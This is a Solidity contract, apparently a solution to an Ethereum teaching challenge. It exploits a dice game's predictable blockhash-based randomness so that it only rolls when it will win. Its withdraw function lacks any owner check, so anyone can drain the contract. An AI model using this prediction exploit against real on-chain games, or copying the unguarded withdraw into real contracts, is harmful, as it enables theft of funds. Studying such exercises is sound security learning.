pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address add, uint256 amount) public {
        (bool succeed, ) = payable(add).call{value: amount}("");
        require(succeed, "Failed to withdraw ether");
    }

    function riggedRoll() public {
        require(
            address(this).balance >= 0.002 ether,
            "Failed to send enough value"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        uint256 _nonce = diceGame.nonce();

        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(this), _nonce)
        );
        uint256 roll = uint256(hash) % 16;

        require(roll <= 2, "The roll is a loser");
        if (roll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    receive() external payable {}
}
